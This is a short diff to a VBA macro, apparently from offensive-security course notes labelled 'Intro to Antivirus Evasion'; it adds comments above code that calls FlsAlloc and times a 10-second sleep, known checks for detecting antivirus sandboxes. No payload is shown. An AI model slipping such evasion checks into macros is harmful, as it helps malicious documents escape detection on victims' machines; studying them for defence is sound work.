@@ -403,13 +403,15 @@ Sub MyMacro()
     Dim counter As Long
     Dim data As Long
     Dim res As LongPtr
-    
+
+    ' Module 6. Intro to Antivirus Evasion
     ' Call FlsAlloc and verify if the result exists
     allocRes = FlsAlloc(0)
     If IsNull(allocRes) Then
         End
     End If
-    
+
+    ' Module 6. Intro to Antivirus Evasion
     ' Sleep for 10 seconds and verify time passed
     t1 = Now()
     Sleep (10000)
